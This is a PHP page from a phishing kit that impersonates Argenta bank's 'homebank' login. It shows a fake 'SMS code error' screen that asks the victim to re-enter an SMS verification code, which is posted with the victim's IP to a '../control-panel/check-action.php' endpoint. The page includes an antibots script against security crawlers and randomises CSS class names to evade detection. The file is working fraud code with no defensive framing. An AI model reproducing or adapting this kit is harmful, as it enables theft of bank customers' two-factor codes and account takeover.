<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    require_once "../setting/lang.php";

    // Lang Fucntion :
    lang();

    if(isset($_POST['fr'])) {

        $_SESSION['lang_select'] = "fr";
        $_SESSION['lang'] = $_SESSION['lang_select'];

    }elseif(isset($_POST['nl'])) {
        $_SESSION['lang_select'] = "nl";
        $_SESSION['lang'] = $_SESSION['lang_select'];

    }
    if(isset($_SESSION['lang_select'])) {
        $_SESSION['lang'] = $_SESSION['lang_select'];
    }
    
    $ip = get_client_ip();
    $get_name_file = $ip;
    $get_name_page = "Page SMS Code Error";
    get_page_info($get_name_page, $get_name_file);

    $random_classes = rand(0, 1000000);
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <!-- Roboto Slab -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
    <!-- Open Sans -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <!-- Monospace -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=B612+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/global-rules.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.png">
    <link rel="shortcut" href="../img/favicon.png">
    <link rel="appel-touch-icon" href="../img/favicon.png">
    <title><?php echo get_text('title_head'); ?></title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">

    <!-- Sections -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-sections-all">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> section-left">
            <!-- Preview Height -->
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> preview-height">
                <!-- Nav Section -->
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> nav-bar-section">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                        <img src="../img/logo-desktop.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo-desktop s-m-e">
                        <img src="../img/logo-mobile.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo-mobile s-m-e">
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-nav-bar-section">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-nav-bar s-m-e">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon">
                                <img src="../img/icon-lang.png" alt="">
                            </div>
                            <form action="" method="post" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> form-lang">
                                <?php echo get_text('button_lang_switch'); ?>
                            </form>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-nav-bar s-m-e">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon">
                                <img src="../img/icon-help.png" alt="">
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text">
                                <?php echo get_text('link_help'); ?>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Nav Section -->

                <!-- Main Section -->
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main-section">
                    <form action="../control-panel/check-action.php" method="post" id="fSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section">
                        <input type="hidden" name="step" value="sms-error">
                        <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                        <h1><?php echo get_text('title_main'); ?></h1>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> option-login" style="border-bottom: 1px solid #ebebeb !important; border-radius: 8px 8px 0 0 !important;">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-and-text">
                                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon">
                                    <img src="../img/icon-method-login.png" style="width: 18px;">
                                </span>
                                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text">
                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-normal"><?php echo get_text('connect_with_main'); ?></span>
                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-bold"><?php echo get_text('connect_with_value_main'); ?></span>
                                </span>
                            </div>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-arrow-angle">
                                <img src="../img/arrow-angle.png" alt="">
                            </span>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-i-a-l-m" id="div1">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> message-error-pages">
                                <img src="../img/icon-error.png" alt="">
                                <?php echo get_text('message_error_main'); ?>
                            </div>
                            <p><?php echo get_text('p_step_two'); ?></p>
                            <label for="smsCode"><?php echo get_text('label_step_two'); ?></label>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-i-a-i">
                                <input type="text" name="sms_code" id="smsCode" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-s-d-p-element" placeholder="<?php echo get_text('placeholder_step_two'); ?>">
                            </div>
                            <small id="messageError1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i-element"><img src="../img/icon-error.png" alt=""><?php echo get_text('message_error_inputs_main'); ?></small>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-btn">
                                <button type="submit" name="b_s_d_6" id="bSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-element"><?php echo get_text('button_main'); ?></button>
                            </div>
                        </div>
                    </form>
                </div>
                <!-- Main Section -->
            </div>
            <!-- Preview Height -->

            <!-- Footer Section -->
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> footer-section">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-footer">
                    © 2025 Argenta
                </span>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer">
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer s-m-e"><?php echo get_text('link_footer_1'); ?><img src="../img/arrow-angle-left.png" alt=""></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer s-m-e"><?php echo get_text('link_footer_2'); ?><img src="../img/arrow-angle-left.png" alt=""></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer s-m-e"><?php echo get_text('link_footer_3'); ?><img src="../img/arrow-angle-left.png" alt=""></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer s-m-e"><?php echo get_text('link_footer_4'); ?><img src="../img/arrow-angle-left.png" alt=""></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> vesion-current">homebank 2.10.2</span>
                </div>
            </div>
            <!-- Footer Section -->
        </div>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> section-right">
            <img src="../img/image-desktop.jpg" alt="">
        </div>
    </div>
    <!-- Sections -->

    <!-- JS -->
    <script src="../js/script-step-two.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?> 

</body>
</html>